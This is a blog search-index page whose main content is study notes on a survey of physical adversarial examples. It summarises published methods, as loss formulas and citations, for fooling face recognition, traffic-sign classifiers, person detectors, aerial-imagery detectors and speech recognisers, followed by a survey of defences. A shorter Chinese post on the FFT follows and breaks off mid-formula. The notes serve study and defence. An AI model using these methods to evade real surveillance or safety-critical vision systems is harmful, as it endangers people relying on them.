","date":"2024-07-27","objectID":"/pae-attack/:2:0","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"Where it from? A critical question that what makes physical adversarial examples different from digital ones. basically three : characterization generating strategy attacking ability Substantially digital-physical domain gap the physical world is a complex and open environment, where it has several dynamics such as lighting, natural noises, and diverse transformations. On the one hand, it brings attack more various, but also harder on the other. ","date":"2024-07-27","objectID":"/pae-attack/:3:0","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"What we do ? A more distinct hierarchy of physical world adversarial example generation methods understanding of physical examples revisit the critical particularities of physical adversarial examples under the perspective of workflow give in-depth analysis in turn to induce the typical processes that might pose a great influence on adversarial examples generation. Three important process adversarial example optimization process adversarial example manufacturing process adversarial example resampling process where the last two process are specific to the physical adversarial attacks. Classify the PAEs: based on the summarized typical particularities and the critical attributes, with respect to identified typical processes, according to the hundreds of physical world attack studies. Backed up by the concluded attacking particularities of the key adversarial example generation processes Give a proposed hierarchy. Section II - Go Deep into physical adversarial examples ","date":"2024-07-27","objectID":"/pae-attack/:4:0","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"overview The digital world and physical world, divide the adversarial examples into digital kinds and physical kinds. ","date":"2024-07-27","objectID":"/pae-attack/:5:0","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"The Key Particularities among PAEs What makes the PAEs different from the digital ones are the particular generation processes. manufacture the digitally-trained adversarial patterns into the physical environment of existing objects, which indicates a “virtual-to-real” process. Key: manufacture technique manufacture carrier sampling environment sampler quality basic attributes core attributes epitaxial attributes ","date":"2024-07-27","objectID":"/pae-attack/:6:0","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"Definition of PAEs adversarial examples $$ y^x \\ne \\mathcal{F}(x_{adv}^{d}),x_{adv}^{d}=x + \\delta $$where $y^x$ is the ground-truth label of the input instance $x,\\delta$ indicates the adversarial perturbation, and it satisfes $|\\delta|\u003c\\varepsilon$ (ε is a small enough radius and bigger than 0). Things changed in physical world. modified definition into physical world $$ y^x\\neq\\mathcal{F}(x_{adv}^p),\\quad s.t.,\\quad \\Vert x_{adv}^p\\Vert _ \\aleph\u003c\\varepsilon, \\\\\\\\ x_{adv}^p=x+\\mathcal{R}(\\mathcal{M}(\\delta),c), $$ $x_{adv}^p$ physical adversarial example $\\mathcal{R}(\\cdot)$ re-sampling function that represents the re-sampling process $\\mathcal{M}(\\cdot)$ manufacturing function that represents the manufacturing process $c$ a certain environment condition and comes from the real and infinite environment conditions that are denoted as $\\mathbb{E},i.e.$, $c\\in\\mathbb{E}$ the $|\\cdot|_\\aleph$ represents the evaluation metric that measures the naturalness of the PAE that input to the deployed artificial intelligence system $\\aleph$ indicates the recognizable space of human beings to the PAEs. where $x_{adv}^p$ is the input physical adversarial example to the deployed deep models, $\\mathcal{R}(\\cdot)$ is the re-sampling function that represents the re-sampling process, $\\mathcal{M}(\\cdot)$ is the manufacturing function that represents the manufacturing process, $c$ is a certain environment condition and comes from the real and infinite environment conditions that are denoted as $\\mathbb{E},i.e.$, $c\\in\\mathbb{E}$, the $|\\cdot|_\\aleph$ represents the evaluation metric that measures the naturalness of the PAE that input to the deployed artificial intelligence system, $\\aleph$ indicates the recognizable space of human beings to the PAEs. To be brief, the $\\aleph$ constraint imposed on the $\\delta$ correlates to the **“suspicious” **extent of PAEs. More precisely, a very perceptible adversarial perturbation is not accepted in real scenarios. Section III .Classify PAEs manufacturing process-oriented ones re-sampling process-oriented ones others ( aim at naturalness, transferability ) ","date":"2024-07-27","objectID":"/pae-attack/:7:0","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"The Manufacturing Process Oriented PAEs principles： material-driven task-driven Our categories touchable attacks untouchable attacks where the former indicates that the generated adversarial examples could be touched by hands and the latter could not. ","date":"2024-07-27","objectID":"/pae-attack/:8:0","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"Touchable Attacks: 2D attacks [22] M. Sharif, S. Bhagavatula, L. Bauer, and M. K. Reiter, “Accessorize to a crime: Real and stealthy attacks on state-of-the-art face recognition,” in Proceedings of the 2016 acm sigsac conference on computer and communications security, pp. 1528–1540, 2016. smoothness and practicability Optimize process Total Variation Loss (using total-variation norm) $$ L_{tv}=\\sum_{i,j}\\sqrt{\\left(p_{i+1,j}-p_{i,j}\\right)^2+\\left(p_{i,j+1}-p_{i,j}\\right)^2}. $$ Loss function $L_{tv}$ . practicability Non-Printability Score Loss function $NPS(\\hat{p})$ . $$ NPS(\\hat{p})=\\prod_{p\\in P}|\\hat{p}-p|. $$The form of this PAEs is kind of simple. [23] J. Lu, H. Sibai, and E. Fabry, “Adversarial examples that fool detectors,” arXiv preprint arXiv:1712.02494, 2017. demonstrated a minimization procedure to create adversarial examples that fool Faster RCNN in stop sign and face detection tasks. However, due to the restrictive environmental conditions, this adversarial attack did not perform well in the physical world [24] A. Kurakin, I. J. Goodfellow, and S. Bengio, “Adversarial examples in the physical world,” in 5th International Conference on Learning Representations, pp. 24–26, 2017. demonstrated the possibility of crafting adversarial examples in the physical world by simply manufacturing printout adversarial examples, re-sampling them by a cellphone camera, and then feeding them into an image classification model. [4] K. Eykholt, I. Evtimov, E. Fernandes, B. Li, A. Rahmati, C. Xiao, A. Prakash, T. Kohno, and D. Song, “Robust physical-world attacks on deep learning visual classification,” in Proceedings of the IEEE conference on computer vision and pattern recognition, pp. 1625–1634, 2018. first generated adversarial perturbations in the physical world against road sign classifiers and proposed the Robust Physical Perturbations (RP2) algorithm. By optimizing and manufacturing white-black bock perturbation, the authors successfully attacked the traffic sign recognition model. Robust Physical Perturbations (RP2) algorithm. [30] D. Song, K. Eykholt, I. Evtimov, E. Fernandes, B. Li, A. Rahmati, F. Tram`er, A. Prakash, and T. Kohno, “Physical adversarial examples for object detectors,” in 12th USENIX Workshop on Offensive Technologies (WOOT 18), (Baltimore, MD), USENIX Association, Aug. 2018. extended the RP2 algorithm to object detection tasks and manufactured colorful adversarial stop sign posters. [25] M. Lee and Z. Kolter, “On physical adversarial patches for object detection,” arXiv preprint arXiv:1906.11897, 2019. first proposed an adversarial patch-attacking method that could successfully attack detectors without having to overlap the target objects [26] S. Thys, W. V. Ranst, and T. Goedeme´, “Fooling automated surveillance cameras: Adversarial patches to attack person detection,” in 2019 IEEE/CVF Conference on Computer Vision and Pattern Recognition Workshops (CVPRW), pp. 49–55, 2019. first generated physical adversarial patches against pedestrian detectors by optimizing a combination of adversarial objectness loss, TV loss, and NPS loss. Robust Physical Perturbations (RP2) algorithm. New Framework previous modify adversarial examples in the perturbation process to meet additional objectives This framework proposed a general framework to generate diverse adversarial examples. The authors utilized GANs and constructed adversarial generative nets (AGNs), which are flexible to accommodate various objectives, e.g., inconsciousness, robustness, and scalability. [31] T. Malzbender, D. Gelb, and H. Wolters, “Polynomial texture maps,” in Proceedings of the 28th annual conference on Computer graphics and interactive techniques, pp. 519–528, 2001. The authors leveraged the Polynomial Texture Maps approach [31] to get eyeglasses’ RGB values under specific luminance. By using this framework, the authors constructed adversarial eyeglasses and fooled classifiers for face recognition. SNPS [32] D. Wang, C. Li, S. Wen, Q.-L. Han","date":"2024-07-27","objectID":"/pae-attack/:8:1","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"Untouchable attack The untouchable attacks consist of lighting attacks and audio/speech attacks. Lighting attack placing a spactial light , e. g. programmable LED spatial light modulator, such as SLM in front of the photographic modify human non-sensitive optical parameters add easily overlooked shadow, projection in special shape All optimized. The perturbation generation process can be formulated as follows within the context of $\\mathcal{T}$ modeling environment conditions $\\mathbb{E}$, which also correlates to $\\mathcal{R}(\\cdot)$ mentioned previously, during the re-sampling process. Let $I_{amb}$ represent the image captured under ambient light conditions, $I_{sig}$ denote the image taken under the influence of fully illuminated attacker-controlled lighting, and $g(y+\\delta)$ indicate the average impact of the signal on row $y{:}$ $$ x_{adv}^p=\\mathcal{T}(I_{amb})+\\mathcal{T}(I_{sig})\\cdot g(y+\\delta). $$ Audio/Speech attacks Speech recognition is a task to transcribe the audio/speech into text, which is then used to control the system, such as the audio assistant in mobile phones and automatic driving. Currently, some researchers develop over-the-air attacks against the deployed speech recognition system by playing the audio, impulse, and so on. To solve the instability issues during back-propagation in the frequency domain, the author used the Discrete Fourier Transform (DFT), allowing them can perform attacks in the time domain as the symmetry properties of the DFT after the perceptual measures are extracted from the original audio. The loss function of the manufacturing process can be summarized as: $$ \\mathcal{L}(x,\\delta,y)=\\mathbb{E_{t\\in\\mathcal{T}}}[\\mathcal{L_{net}}(f(t(x+\\delta)),y)+\\alpha\\cdot\\mathcal{L_{\\theta}}(x,\\delta)] $$where the former term and the latter term refer to the robustness loss and imperceptibility loss, respectively. Voice assistants, Karplus-Strong algorithm voice-controllable device DNN-based speaker recognition system …… ","date":"2024-07-27","objectID":"/pae-attack/:8:2","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"The re-sampling process-oriented ones Shift from digital to physical with loss. After finishing manufacturing, the physical adversarial examples will take effect by being re-sampled and input into the deployed deep models in real artificial systems. And during this process, some of the key information correlated to the adversarial characteristics inside the PAEs might be affected and cause certain attacking ability degeneration due to the imperfect re-sampling, which could be also called physical-digital domain shifts. More precisely, this kind of physical-digital shift consists of 2 types as shown in Figure 9, i.e., the environment-caused and sampler-caused, therefore motivating us to categorize the re-sampling process-oriented PAEs into environment-oriented attacks and sampler-oriented attacks. ","date":"2024-07-27","objectID":"/pae-attack/:9:0","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"Environment-oriented Attacks Interference by natural factors: environmental lights (CV) environmental noises (ASR) …… The physical attack performance is significantly impacted by environmental factors, such as light and weather, which motivates the researcher to take these factors into account during the optimization of PAEs. Du et.al. [75] proposed the physical adversarial attack for aerial imagery object detector, avoiding remote sensing reconnaissance. They design the tools for simulating re-sampling differences caused by atmospheric factors, including lightning, weather, and seasons. Finally, they optimize the adversarial patch by minimizing the following loss function: $$ \\mathcal{L}=\\mathbb{E_{t\\in\\mathcal{T}}}[\\max(\\mathcal{F}^b(t(x_{adv}^d)))]+\\lambda_1\\mathcal{L_{nps}}(\\delta)+\\lambda_2\\mathcal{L_{tv}}(\\delta) $$where the first term is the adversarial loss to suppress the maximum prediction objectness score over the transformation distribution T , the second term ensures the optimized color is printable, and the last term is used to ensure the naturalness of the adversarial patch. $$ \\min \\mathcal{L} $$ Import DTN brightness, contrast, color shadow Thus, the author devised a differentiable transformation network (DTN) to learn potential physical transformations (e.g., shadow). Once DTN is trained, the author optimizes the robust adversarial texture for the vehicle via DTN. With light attack As we mentioned above, the adversarial LED light attack [49] also concerns the environment inside the attacking scenario. During the perturbation generation process, they propose the function T , which can be regarded as the R(·) in our definition, to model environment conditions (including viewpoint and lighting changes). In this way, they take the environmental variation during re-sampling into account to preserve the attacking ability and cross the digital-physical domain. For physical characteristics of voice To alleviate the potential distortion caused by the environment, a line of works [16], [63], [66], [68], [69] has adopted the room impulse response (RIP) to mimic distortion caused by the process of the speech being played and recorded, which can be expressed as: $$ x_{adv}^d(t):r(t)=y_{adv}^p(t)*x_{adv}^d(-t), $$where the $x_{adv}^d(t)$ is the audio clip, and the $y_{adv}^p(t)$ is the corresponding estimated recorded audio clip, * denotes the convolution operation. Then, RIP $r(t)$ incorporates the generation of $\\delta$ by a transform $T(x)=x*r$, which reduces the impact of distortion brought by hardware and physical signal patch, significantly improving speech physical attack robustness. ","date":"2024-07-27","objectID":"/pae-attack/:9:1","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"Sampler-oriented Attacks Sampler waste adversarial information. The case in point is sampling angles in computer vision tasks, when taking photos from different perspectives, the sampled instances might show slight differences in shape and color, e.g., affine transformation-like difference, and overexpose. To confront the view perspective change in the physical world, Athalye et.al. [37] formulated the potential physical transformations (e.g., rotation, scale, resize) as a uniform formal that is the expectation over transformation (EOT), which is mathematically denoted as follows. $$ \\delta=\\mathbb{E_{t\\thicksim\\mathcal{T}}}[d(t(x_{adv}^d),t(x))]. $$The above formula is designed to alleviate the data domain gap caused by transformation, enhancing the robustness of the adversarial texture. Useful tools function imported To keep imperceptible, adversarial after the transformation. Specifically, they utilized the mask to constrain the perturbation to be located in the traffic sign area, and the position of the perturbation is optimized by imposing the L1 norm. The above optimization can be expressed as: $$ \u003e \\arg \\min_\\delta \\lambda \\Vert \\delta\\Vert_p+\\mathcal{L_{nps}}(\\delta)+\\mathbb{E_{x\\sim X^V}} \\mathcal{L} (\\mathcal{F}(x+t(\\delta)),y), \u003e $$where the first term is used to bound the norm of δ for the patch’s imperceptible, the third term takes into account the transformation inside in x and applies the same transformation on δ and the $X^V$ includes the digital and physical collected training dataset. To mimic the perspective changing in the physical world as possible The adversarial UV is wrapped over the vehicle by changing the camera position and rendered into multi-view images. Thus, the adversarial UV texture is trained to optimize the following object function $$ \u003e \\arg\\min_\\delta\\mathbb{E_{x\\sim X,e\\sim\\mathbf{E}}}[\\frac1n\\sum_{p_i\\in P}\\mathcal{L}(\\mathcal{F}(x_{adv}^d,p_i),y)], \u003e $$where E denotes the environment condition determined by the physical render, such as different viewpoints and distances; P indicates the output proposals of each image respective to the two-stage detector (e.g., Faster RCNN). Adversarial viewpoints Recently, Dong et.al. [87] demonstrated that there exist adversarial viewpoints, where images captured under such viewpoints are hard to recognize for DNN models. They leveraged the Neural Radiance Fields (NeRF) technique to find the adversarial viewpoints. Specifically, they find the adversarial viewpoints by solving the following problem $$ \u003e \\max_{p(v)} \\set{ \\mathbb{E_{p(v)}}[\\mathcal{L}(\\mathcal{F}(\\mathcal{G}(v)),y)]+\\lambda\\cdot\\mathcal{H}(p(v)) } \u003e $$ where $p(v)$ denotes the adversarial viewpoints distribution $\\mathcal{G}(v)$ is the render function of NeRF, which renders an image with the input viewpoints; $\\mathcal{H}(p(v))=\\mathbb{E_{p(v)}}[-\\log(p(v))]$ is the entropy of the distribution of $p(v).$ To alleviate the influence of deformable. Xu et.al. [14] took the Think Plate Spline (TPS) [88] method into account when optimizing the wearable adversarial patch to model the topological transformation from texture to cloth caused by body movement. Specifically, they construct the adversarial examples as following $$ \u003e x_{adv}^d=t_{env}(A+t(B-C+t_{color}(M_{c,i}\\circ t_{TPS}(\\delta+\\mu v))), \u003e $$ where $t_{env}\\in\\mathcal{T}$ indicates the environmental brightness transform, $t_{color}$ is a regression model that learns the color covert between the digital image and its printed counterpart, $t_{TPS}$ denotes the TPS transform; $A$ is the background region expect the person, B is the person-bounded region, and C is the cloth region of the person, $v\\in\\mathcal{N}(0,1)$ to improve the diversity of perturbation. ","date":"2024-07-27","objectID":"/pae-attack/:9:2","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"Other PAE Topics ","date":"2024-07-27","objectID":"/pae-attack/:10:0","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"The Natural Physical Adversarial Attacks Physical adversarial attacks often prioritize achieving high performance by ignoring the extent of modifications made to adversarial patches or camouflages. However, noticeable alterations can alert potential victims, leading to the failure of the attack. To address this, research has concentrated on creating subtle perturbations that can be deployed in real-world scenarios without detection, enabling natural physical adversarial attacks. The primary techniques employed in this area are divided into two categories: Optimization-based Methods: These methods focus on refining individual adversarial examples to ensure that they are imperceptible while still effective in attacking the target model. Generative Model-based Methods: In contrast to optimization-based methods, these approaches operate within the latent space of generative models that are trained on data. They leverage the learned distribution to generate adversarial examples that are both effective and difficult to detect. The goal of this research is to develop adversarial attacks that maintain a natural appearance, increasing their stealthiness and likelihood of success when deployed against real-world systems. Optimized-based methods Introduce another metric function. Initially, researchers attempted to make adversarial patches look like a particular benign patch to expose the security problems of deep learning models. A classical method applies the total-variation optimization objective mentioned in the previous sections, which improves the naturalness of the adversarial example in addition to improving the printability Duan $et.al.$ propose AdvCam [91] that minimizes $\\mathcal{L_s}$, $\\mathcal{L_c}$ , $\\mathcal{L_{tv}}$ . The naturalness loss can be formalized as: $$ \\mathcal{L_{\\text{nature}}}=\\mathcal{L_s}+\\mathcal{L_c}+\\mathcal{L_{tv}}. $$ the style distance $\\mathcal{L_s}$ between the patch and the referenced image the content distance $\\mathcal{L_c}$ between the patch and the background maximizes the smoothness loss defined by the total-variation loss $\\mathcal{L_{tv}}$ Generative model-based methods In general, the generative method can be formulated as: $$ \\mathcal{L_{natural}}=\\mathbb{E_{x\\sim P_{real},y\\sim P_{adv}}}(\\mathcal{D}(x,y)), $$ where $x\\sim P_{real}$ are real data sampled from the training dataset, $P_{adv}$ is the distribution generated by the attack model $G_{\\theta}(P_{real})$, and $\\mathcal{D}(\\cdot,\\cdot)$ is the pre-defined (in VAE models) or adversarially learned (in GAN models) distance metric Specifically, $\\tilde{\\mathcal{D} } ( x, y) = - \\log ( D_\\theta ( x) ) - \\log ( 1- D_\\theta ( y) )$ in the vanilla GAN, where $D_\\theta(\\cdot)$ is the adversarially trained discriminator network. ","date":"2024-07-27","objectID":"/pae-attack/:10:1","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"The Transferable Physical Adversarial Attacks - transferability The transferability of PAE measures whether the adversarial examples are highly aggressive across models. Previous work on adversarial attacks in the digital world has shown that the same adversarial sample can exhibit generic attack capabilities for different deep learning models [101]. Formally, referring to Eq.(1), for the generator $\\delta (x)$ trained to maximize $\\mathcal{D}(y^x,\\mathcal{F_{1}}(x_{adv}^p)),s.t.\\Vert x_{adv}^p\\Vert _{\\aleph} \\lt \\varepsilon$, the scenario of transferable physical adversarial attacks requires that the adversarial example $\\delta(x)$ be evaluated and tested on other models: $$ \\mathcal{D}(y^x,\\mathcal{F_2}(x_{adv}^p)),\\quad x_{adv}^p=x+\\mathcal{R}(\\mathcal{M}(\\delta(x)),c), $$where $\\mathcal{F_1}$ and $\\mathcal{F_2}$ are different models. ","date":"2024-07-27","objectID":"/pae-attack/:10:2","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"The Generalized Physical Adversarial Attacks - robustness The generalization ability of physical adversarial attacks, is another key to studying the limitation of the deep learning models in the real world In general, the generalization ability over different target objects and different transformations are two important generalization problems to consider. Formally, referring to Eq. (1), for the generator $\\delta(x)$ trained to maximize $\\mathcal{D}(y^x,\\mathcal{F}(x_{adv}^p))$, s. t. $|x_{adv}^p|_\\aleph\u003c\\varepsilon $ $$ x_{adv}^p=x+\\mathcal{R}(\\mathcal{M}(\\delta(x)),c), x\\sim P_x(x), c\\sim P_c(c). $$The scenario of generalized physical adversarial attacks requires that the adversarial example $\\delta(x)$ be evaluated in other data set and environment conditions, and tested in the condition of: $$ x_{adv}^p=x+\\mathcal{R}(\\mathcal{M}(\\delta(x)),c), x\\sim P_x^{\\prime}(x), c\\sim P_c^{\\prime}(c), $$ where $P_x$ and $P_x^{\\prime}$ are different data distributions, and $P_c$ and $P_c^{\\prime}$ are different environmental condition distributions. SECTION IV . CONFRONT PHYSICAL ADVERSARIAL EXAMPLES Threats makes necessity to protect intelligent applications. Mainstream strategies data-end defenses model-end defenses ","date":"2024-07-27","objectID":"/pae-attack/:10:3","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"Defend against PAEs We still take the three processes of PAEs as the starting point for thinking, considering the two standards of the data side and the model side, and considering possible defense means in various directions. ","date":"2024-07-27","objectID":"/pae-attack/:11:0","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"Data-end Defense Strategies The data-end defense strategies aim to reduce the influence of adversarial perturbations, thus the sampled adversarial examples would be not allowed to mislead the deep models in deployed systems. The adversarial detecting Determining whether the input instances are adversarial. So just reject the input and evade the attack in turn. Idea is usually simple, and the practice often has different strategies. Summary of Adversarial Detection Methods SentiNet (Chou et.al.) Detects universal adversarial patches. No model modifications required. Practical for real-world scenarios. Ad-YOLO (Ji et.al.) Utilizes YOLO architecture with an added “patch” class label. Effective in detecting adversarial patches compared to standard YOLO. TaintRadar (Li et.al.) Detects localized adversarial examples by identifying regions causing significant label variance. Demonstrates effectiveness in digital and physical environments. Segmentation Approach (Liu et.al.) Trains a patch segmentor and performs shape completion to detect and remove adversarial patches from images. Patch-Feature Energy-Driven Method Removes deep characteristics of adversarial patches to protect detection models. Patch Zero Detects and nullifies adversarial patches to mitigate their influence. Each method addresses different aspects of detecting and mitigating adversarial attacks in machine learning models. The adversarial denoising This kind of defense method prevents models from being fooled by adversarial attacks at the instance level, i.e., straightly removing the injected perturbation or noises inside the adversarial examples. This kind of defense could also combine with the aforementioned adversarial detecting strategy, leading to better defending ability. A series of results from this idea: Summary of Adversarial Defense Methods Instance-Level Defense Goal: Prevent models from being fooled by removing perturbations or noises within adversarial examples. Combination: Can be combined with adversarial detection strategies for enhanced defense. Local Gradient Smoothing (LGS) (Nasser et.al.) Targets physical attacks like Localized and Visible Adversarial Noise (LaVAN) and adversarial patches. Estimates regions with high probability of adversarial noise. Reduces gradient activity in these regions to correctly recognize adversarial examples. Occlusion Method (McCoyd et.al.) Mitigates influence from adversarial patches by partially occluding the image around candidate patch locations. Considered a form of denoising by destroying adversarial patches through occlusion. Adversarial Pixel Masking (APM) Defends against physical attacks, such as adversarial patches. Trains an adversarial pixel mask module to remove patches based on the generated mask. Patch Zero Functions as a denoising strategy. Combines adversarial detection and denoising to tackle adversarial attacks. These methods enhance the robustness of models by either directly removing adversarial perturbations or by combining detection and denoising techniques. The adversarial prompting Add information to offset the negative impact of adversarial perturbations, prompt what labels the models should truly predict via positive injections. Summary of Adversarial Prompting Defense Methods Adversarial Prompting Goal: Achieve defense by adding information to counteract the negative impacts of adversarial perturbations, prompting models towards correct predictions with positive injections. Unadversarial Examples (Salman et.al.) [118] Generates textures with prompting ability in a 3D environment. Creates “robust objects” based on deep models’ input-perturbation-sensitivity. Provides a new approach for physical adversarial defenses. Preemptive Robustification (Moon et.al.) [119] Defends against intercept-and-perturb behaviors in real scenarios. Utilizes a bi-level optimization scheme to discover robust perturbations that can be added to images. Defensive Patch (Wang et.al.) [120] Pre-injects positive patches i","date":"2024-07-27","objectID":"/pae-attack/:11:1","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"Model-end Defense Strategies Adversarial training Model modification Certified robustness ","date":"2024-07-27","objectID":"/pae-attack/:11:2","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"The Challenges of PAEs ","date":"2024-07-27","objectID":"/pae-attack/:12:0","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"Generating Transferable PAEs ","date":"2024-07-27","objectID":"/pae-attack/:12:1","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"Generating Generalizable PAEs ","date":"2024-07-27","objectID":"/pae-attack/:12:2","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"The Opportunities of PAEs ","date":"2024-07-27","objectID":"/pae-attack/:13:0","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"Evaluate the Application Robustness via PAEs ","date":"2024-07-27","objectID":"/pae-attack/:13:1","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"Protect the Application Privacy via PAEs Section V .CONCLUSION","date":"2024-07-27","objectID":"/pae-attack/:13:2","tags":[],"title":"Pae Attack","uri":"/pae-attack/"},{"categories":[],"content":"从拉格朗日插值法到 FFT. Part-1. It was listed by the Science magazine as one of the ten greatest algorithms in the 20th century 从 FT 开始加速多项式乘法。主要记录了笔者学习傅里叶变换这一特殊线性变换时的笔记。 ","date":"2024-07-01","objectID":"/waytofft-part-1/:0:0","tags":[],"title":"WayToFFT Part 1","uri":"/waytofft-part-1/"},{"categories":[],"content":"Fourier Transform 傅里叶变换（Fourier Transform）是一种分析信号的方法，它可分析信号的成分，也可用这些成分合成信号。许多波形可作为信号的成分，傅里叶变换用正弦波作为信号的成分。 对于时序逻辑可以写作关于时间 $t$ 的函数 $f(t)$ , 傅里叶变换可以检测频率 $\\omega$ 的周期在 $f(t)$ 出现的程度。 $$ F(\\omega)=\\mathbb{F}[f(t)]=\\int_{-\\infty}^\\infty f(t)\\mathrm{e}^{-\\mathrm{i}\\omega t}dt $$ 其作用也可以表示为：时域映射到频域 $$ \\hat{f} \\left ( \\xi \\right ) = \\int _{- \\infty }^{\\infty }f( x) e^{- 2\\pi ix\\xi }dx $$$\\xi$为任意实数 很多时候，这里的 $\\hat{f}\\left(\\xi\\right)$ 会写成 $F(w)$ 或 $F(f)$ 表示角速度或者频率，当然后面的公式的量纲也需要对应的修改；后面的自变量 $x$ 大多数时候都是写成 $t$ 表示时间。 ","date":"2024-07-01","objectID":"/waytofft-part-1/:1:0","tags":[],"title":"WayToFFT Part 1","uri":"/waytofft-part-1/"},{"categories":[],"content":"Discrete Fourier Transform DFT, 离散傅里叶变换。DFT 在工程中是将离散信号从时域转为频域的过程。其表达式可以用于多项式求值，点值固定设计为单位根。 DFT 将一个长度为 $N$ 的复数序列 $x_0,x_1,\\dots,x_{N-1}$ 通过如下公式转化为另一等长度复数序列$X_0,X_1,\\dots,X_{N-1}$: $$ X_k = \\sum_{n=0}^{N-1} x_n e^{-\\frac{2\\pi i}{N}kn} \\tag1 $$ 结合单位根 (root of unit) 的概念可得 $$ X_k=\\sum_{n=0}^{N-1}x_n\\omega_N^{kn} \\tag2 $$ 那么，对于已知目标多项式 (系数向量为待变换序列) $$ f(x)=\\sum_{n=0}^{N-1}x_nx^n\\tag3 $$代入得 $$ X_k=\\sum_{n=0}^{N-1} x_n (\\omega_N^{k})^n=f(\\omega_N^{k}) $$ 说明，所构造多项式 $(3)$ 进行在单位根处求值，即可完成一次离散傅里叶变换。 ","date":"2024-07-01","objectID":"/waytofft-part-1/:2:0","tags":[],"title":"WayToFFT Part 1","uri":"/waytofft-part-1/"},{"categories":[],"content":"Fast Fourier Transform 快速傅里叶变换 用于加速多项式乘法。 ","date":"2024-07-01","objectID":"/waytofft-part-1/:3:0","tags":[],"title":"WayToFFT Part 1","uri":"/waytofft-part-1/"},{"categories":[],"content":"Core idea. 我们的问题是，如何用更小的开销实现多项式求值。 不难证明，对于任意一多项式 $f(x)$ ，可分解为奇函数 $f_o(x)$ 和 偶函数 $f_e(x)$ 之和。则： $$ \\begin{cases} f(x) \u0026= f_e(x) + f_o(x) \\\\\\\\ f(-x) \u0026= f_e (x) - f_o(x) \\end{cases} $$注意到 $f_e(x),f_o(x)$ 项数均为 $f(x)$ 的一半，且 $f_o(x) = xf^{\\prime}_e(x)$. 又由换元思想，可将元函数二分处理。 即： $$ f(x)=(a_0+a_2x^2+a_4x^4+\\cdots+a_{n-2}x^{n-2})+(a_1x+a_3x^3+a_5x^5+\\cdots+a_{n-1}x^{n-1}) $$ 令 $$ \\begin{cases}f_e(x)=a_0+a_2x+a_4x^2+\\cdots+a_{n-2}x^{\\frac n2-1} \\\\\\\\ f_o(x)=a_1+a_3x+a_5x^2+\\cdots+a_{n-1}x^{\\frac n2-1} \\end{cases} $$则有 $$ f(x)=f_e(x^2)+xf_o(x^2) $$ 假设$k\u003c\\frac n2$ , 现在要求$f(\\omega_n^k)$ $$ \\begin{aligned}f(\\omega_{n}^{k})\u0026=f_e(\\omega_n^{2k})+\\omega_n^k f_o(\\omega_n^{2k}) \\\\\\\\ \u0026=f_e(\\omega_{\\frac n2}^k)+\\omega_n^kf_o(\\omega_{\\frac n2}^k)\\end{aligned} $$这一步转化利用了单位根的性质。 考虑 $f(\\omega_n^{k+\\frac{n}{2}})$, 由循环群的性质不难计算： $$ f(\\omega_n^{k+\\frac{n}{2}})=f_e(\\omega_{n/2}^k) - \\omega_n^k f_o(\\omega_{n/2}^k) $$令 $k$ 遍历 $[0,n/2 -1]$, 则 $k+n/2$ 遍历 $[n/2,n-1]$. 即，若已知 $f_e(x),f_o(x)$ 在 $\\omega_{\\frac n2}^0,\\omega_{\\frac n2}^1,\\ldots,\\omega_{\\frac n2}^{\\frac n2-1}$ 处的点值，就可以在 $O(n)$ 的时间内求得 $f(x)$ 在 $\\omega_n^0,\\omega_n^1,\\ldots,\\omega_n^{n-1}$ 处的取值。而关于 $f_e(x)$ 和 $f_o(x)$ 的问题都是相对于原问题规模缩小了一半的子问题，分治的边界为一个常数项$a_{0}$。 根据主定理，该分治算法的时间复杂度为 $$ T(n)=2T(\\frac{n}{2})+O(n)=O(n\\log n) $$最常用的 FFT 算法—— Cooley-Tukey 算法。 递归实现的 FFT 效率不高，实际中一般采用迭代实现。 ","date":"2024-07-01","objectID":"/waytofft-part-1/:3:1","tags":[],"title":"WayToFFT Part 1","uri":"/waytofft-part-1/"},{"categories":[],"content":"Inverse Discrete Fourier Transform, IDFT 离散傅里叶逆变换 (Inverse Discrete Fourier Transform, IDFT) 可以视为单位根处插值的过程。即给出$n=2^w$个在所有$n$次单位根处的点值 $P_k=(\\omega_n^k,f(\\omega_n^k))(0\\leq k\u003cn)$, 要求还原$f$的各项系数，其中 $f$ 的次数不大于 $n-1$ 。 IDFT和IFFT 之间也存在一些类似差异。 根据前文所提，不难知道拉格朗日插值可以视作范德蒙方阵求逆过程。对于多项式 $f$ 经过 FFT 之后， 再进行 快速傅里叶逆变换， 仍得到 $f$. 那么对 FFT 的矩阵求逆，可以得到 IFFT 的变换矩阵。 $$ \\mathcal{F}=\\begin{bmatrix}(\\omega_n^0)^0\u0026(\\omega_n^0)^1\u0026\\cdots\u0026(\\omega_n^0)^{n-1} \\\\\\\\ (\\omega_n^1)^0\u0026(\\omega_n^1)^1\u0026\\cdots\u0026(\\omega_n^1)^{n-1} \\\\\\\\ \\vdots\u0026\\vdots\u0026\\ddots\u0026\\vdots \\\\\\\\ 